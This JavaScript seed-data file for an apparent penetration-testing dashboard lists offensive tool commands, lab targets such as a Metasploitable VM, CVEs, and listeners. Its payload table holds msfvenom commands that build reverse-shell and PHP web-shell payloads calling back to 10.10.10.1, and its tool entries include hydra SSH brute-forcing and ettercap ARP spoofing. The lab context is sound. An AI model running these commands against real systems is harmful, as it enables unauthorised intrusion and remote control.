// Seed data for Z-Linux OS Core

export const seedTools = [
  { id: 1, name: 'nmap', category: 'Recon', description: 'Network mapper and port scanner', version: '7.95', command: 'nmap -sV -sC {target}', status: 'installed', icon: 'scan' },
  { id: 2, name: 'masscan', category: 'Recon', description: 'Fast Internet-scale port scanner', version: '1.3.2', command: 'masscan -p1-65535 {target} --rate=1000', status: 'installed', icon: 'radar' },
  { id: 3, name: 'nikto', category: 'Recon', description: 'Web server vulnerability scanner', version: '2.5.0', command: 'nikto -h {target}', status: 'installed', icon: 'globe' },
  { id: 4, name: 'theHarvester', category: 'Recon', description: 'OSINT email and subdomain harvester', version: '2.2.9', command: 'theHarvester -d {domain} -b all', status: 'installed', icon: 'mail' },
  { id: 5, name: 'recon-ng', category: 'Recon', description: 'Full-featured recon framework', version: '5.1.2', command: 'recon-ng', status: 'not-installed', icon: 'search' },
  { id: 6, name: 'metasploit', category: 'Exploitation', description: 'Exploitation framework with 2000+ modules', version: '6.4.30', command: 'msfconsole', status: 'installed', icon: 'exploit' },
  { id: 7, name: 'sqlmap', category: 'Exploitation', description: 'Automatic SQL injection tool', version: '1.8.10', command: 'sqlmap -u {url} --batch', status: 'installed', icon: 'database' },
  { id: 8, name: 'burpsuite', category: 'Exploitation', description: 'Web application security testing proxy', version: '2024.12', command: 'burpsuite', status: 'installed', icon: 'proxy' },
  { id: 9, name: 'hydra', category: 'Exploitation', description: 'Fast network logon cracker', version: '9.5', command: 'hydra -L users.txt -P pass.txt {target} ssh', status: 'installed', icon: 'key' },
  { id: 10, name: 'john', category: 'Exploitation', description: 'Password strength testing tool', version: '1.9.0', command: 'john --wordlist=rockyou.txt {hashfile}', status: 'installed', icon: 'lock' },
  { id: 11, name: 'aircrack-ng', category: 'Wireless', description: 'WiFi security auditing suite', version: '1.7', command: 'aircrack-ng -w wordlist.txt {capfile}', status: 'installed', icon: 'wifi' },
  { id: 12, name: 'wifite', category: 'Wireless', description: 'Automated wireless attack tool', version: '2.7.0', command: 'wifite --kill', status: 'not-installed', icon: 'signal' },
  { id: 13, name: 'ettercap', category: 'Wireless', description: 'Man-in-the-middle attack suite', version: '0.8.3.1', command: 'ettercap -T -M arp /{target}//', status: 'installed', icon: 'network' },
  { id: 14, name: 'kismet', category: 'Wireless', description: 'Wireless network detector and sniffer', version: '2023-07', command: 'kismet', status: 'not-installed', icon: 'antenna' },
  { id: 15, name: 'wireshark', category: 'Forensics', description: 'Network protocol analyzer', version: '4.4.3', command: 'tshark -i eth0', status: 'installed', icon: 'packet' },
  { id: 16, name: 'volatility', category: 'Forensics', description: 'Memory forensics framework', version: '3.0', command: 'vol -f {memdump} windows.info', status: 'installed', icon: 'memory' },
  { id: 17, name: 'sleuthkit', category: 'Forensics', description: 'Digital forensic toolkit for disk analysis', version: '4.12.1', command: 'fls -r {image}', status: 'installed', icon: 'disk' },
  { id: 18, name: 'ghidra', category: 'Reverse Engineering', description: 'Software reverse engineering suite by NSA', version: '11.2.1', command: 'ghidra', status: 'installed', icon: 'binary' },
  { id: 19, name: 'radare2', category: 'Reverse Engineering', description: 'Portable reverse engineering framework', version: '5.9.0', command: 'r2 -A {binary}', status: 'installed', icon: 'hex' },
  { id: 20, name: 'binwalk', category: 'Reverse Engineering', description: 'Firmware analysis and extraction tool', version: '2.4.3', command: 'binwalk -e {firmware}', status: 'installed', icon: 'chip' },
];

export const seedTargets = [
  { id: 1, name: 'Metasploitable VM', ip: '10.10.10.5', scope: '10.10.10.0/24', status: 'scanning', os: 'Linux 2.6 (Ubuntu)', createdAt: '2026-10-17T09:00:00Z' },
  { id: 2, name: 'Internal Web Server', ip: '192.168.1.100', scope: '192.168.1.0/24', status: 'complete', os: 'Windows Server 2019', createdAt: '2026-10-17T08:30:00Z' },
  { id: 3, name: 'Edge Router', ip: '172.16.0.50', scope: '172.16.0.0/16', status: 'idle', os: 'Cisco IOS 15.x', createdAt: '2026-10-17T10:00:00Z' },
  { id: 4, name: 'IoT Camera', ip: '10.10.10.20', scope: '10.10.10.0/24', status: 'scanning', os: 'Embedded Linux', createdAt: '2026-10-17T11:00:00Z' },
];

export const seedPorts = [
  { id: 1, target_id: 1, port: 21, service: 'ftp', state: 'open', version: 'vsftpd 2.3.4' },
  { id: 2, target_id: 1, port: 22, service: 'ssh', state: 'open', version: 'OpenSSH 4.7p1' },
  { id: 3, target_id: 1, port: 23, service: 'telnet', state: 'open', version: 'Linux telnetd' },
  { id: 4, target_id: 1, port: 80, service: 'http', state: 'open', version: 'Apache 2.2.4' },
  { id: 5, target_id: 1, port: 445, service: 'smb', state: 'open', version: 'Samba 3.0.20' },
  { id: 6, target_id: 1, port: 5432, service: 'postgresql', state: 'open', version: 'PostgreSQL 8.3.0' },
  { id: 7, target_id: 1, port: 5900, service: 'vnc', state: 'open', version: 'VNC 3.3' },
  { id: 8, target_id: 1, port: 8181, service: 'http', state: 'filtered', version: 'Tomcat 5.5' },
  { id: 9, target_id: 2, port: 80, service: 'http', state: 'open', version: 'IIS 10.0' },
  { id: 10, target_id: 2, port: 443, service: 'https', state: 'open', version: 'IIS 10.0' },
  { id: 11, target_id: 2, port: 3389, service: 'rdp', state: 'open', version: 'Microsoft Terminal Services' },
  { id: 12, target_id: 2, port: 445, service: 'smb', state: 'open', version: 'Windows SMB' },
  { id: 13, target_id: 2, port: 1433, service: 'mssql', state: 'filtered', version: 'MS SQL Server 2019' },
  { id: 14, target_id: 3, port: 22, service: 'ssh', state: 'open', version: 'Cisco SSH' },
  { id: 15, target_id: 3, port: 80, service: 'http', state: 'open', version: 'Cisco HTTP Server' },
  { id: 16, target_id: 3, port: 161, service: 'snmp', state: 'open', version: 'SNMP v1/v2c' },
  { id: 17, target_id: 4, port: 80, service: 'http', state: 'open', version: 'Boa HTTPd 0.94' },
  { id: 18, target_id: 4, port: 554, service: 'rtsp', state: 'open', version: 'RTSP 1.0' },
];

export const seedVulns = [
  { id: 1, target_id: 1, cve: 'CVE-2011-2523', severity: 'critical', description: 'vsftpd 2.3.4 backdoor command execution', status: 'confirmed' },
  { id: 2, target_id: 1, cve: 'CVE-2007-2447', severity: 'critical', description: 'Samba 3.0.20 username map script command injection', status: 'confirmed' },
  { id: 3, target_id: 1, cve: 'CVE-2009-3555', severity: 'high', description: 'Apache SSL/TLS renegotiation DoS', status: 'confirmed' },
  { id: 4, target_id: 1, cve: 'CVE-2016-9838', severity: 'high', description: 'PostgreSQL format string vulnerability', status: 'potential' },
  { id: 5, target_id: 2, cve: 'CVE-2020-0796', severity: 'critical', description: 'SMBv3 compression RCE (SMBGhost)', status: 'confirmed' },
  { id: 6, target_id: 2, cve: 'CVE-2019-0708', severity: 'critical', description: 'BlueKeep RDP remote code execution', status: 'confirmed' },
  { id: 7, target_id: 2, cve: 'CVE-2020-1350', severity: 'high', description: 'DNS SIG IS RCE via crafted SIG record', status: 'potential' },
  { id: 8, target_id: 4, cve: 'CVE-2017-8225', severity: 'high', description: 'Boa HTTPd authentication bypass', status: 'confirmed' },
];

export const seedPayloads = [
  { id: 1, name: 'Meterpreter Reverse TCP', type: 'meterpreter', target_id: 1, format: 'raw', lhost: '10.10.10.1', lport: 4444, encoder: 'none', status: 'ready', createdAt: '2026-10-17T09:15:00Z', encoded: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw' },
  { id: 2, name: 'Linux Shell Reverse', type: 'shellcode', target_id: 1, format: 'c', lhost: '10.10.10.1', lport: 8080, encoder: 'shikata_ga_nai', status: 'generated', createdAt: '2026-10-17T09:30:00Z', encoded: 'msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.1 LPORT=8080 -e x86/shikata_ga_nai -f c' },
  { id: 3, name: 'PHP Web Shell', type: 'webshell', target_id: 2, format: 'php', lhost: '10.10.10.1', lport: 4444, encoder: 'none', status: 'ready', createdAt: '2026-10-17T08:45:00Z', encoded: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw' },
];

export const seedListeners = [
  { id: 1, name: 'Meterpreter Listener', type: 'meterpreter', host: '10.10.10.1', port: 4444, status: 'active', payload_id: 1 },
  { id: 2, name: 'Shell Listener', type: 'shell', host: '10.10.10.1', port: 8080, status: 'idle', payload_id: 2 },
];

export const seedLogs = [
  { id: 1, target_id: 1, tool_id: 1, message: 'Starting nmap scan on 10.10.10.5', level: 'info', timestamp: '2026-10-17T09:00:01Z' },
  { id: 2, target_id: 1, tool_id: 1, message: 'Discovered open port 21/tcp (ftp)', level: 'info', timestamp: '2026-10-17T09:00:15Z' },
  { id: 3, target_id: 1, tool_id: 1, message: 'Discovered open port 22/tcp (ssh)', level: 'info', timestamp: '2026-10-17T09:00:16Z' },
  { id: 4, target_id: 1, tool_id: 1, message: 'Discovered open port 445/tcp (smb) - Samba 3.0.20', level: 'warning', timestamp: '2026-10-17T09:00:20Z' },
  { id: 5, target_id: 1, tool_id: 1, message: 'Vulnerability detected: CVE-2007-2447 (Samba RCE)', level: 'error', timestamp: '2026-10-17T09:00:35Z' },
  { id: 6, target_id: 2, tool_id: 3, message: 'Nikto scan complete on 192.168.1.100', level: 'info', timestamp: '2026-10-17T08:35:00Z' },
  { id: 7, target_id: 2, tool_id: 3, message: 'Server may leak information via headers: X-Powered-By', level: 'warning', timestamp: '2026-10-17T08:35:10Z' },
  { id: 8, target_id: 4, tool_id: 2, message: 'Masscan started on 10.10.10.20 (ports 1-65535)', level: 'info', timestamp: '2026-10-17T11:00:05Z' },
  { id: 9, target_id: 4, tool_id: 2, message: 'Rate: 1000 packets/s, 0:01:23 elapsed', level: 'info', timestamp: '2026-10-17T11:01:28Z' },
];
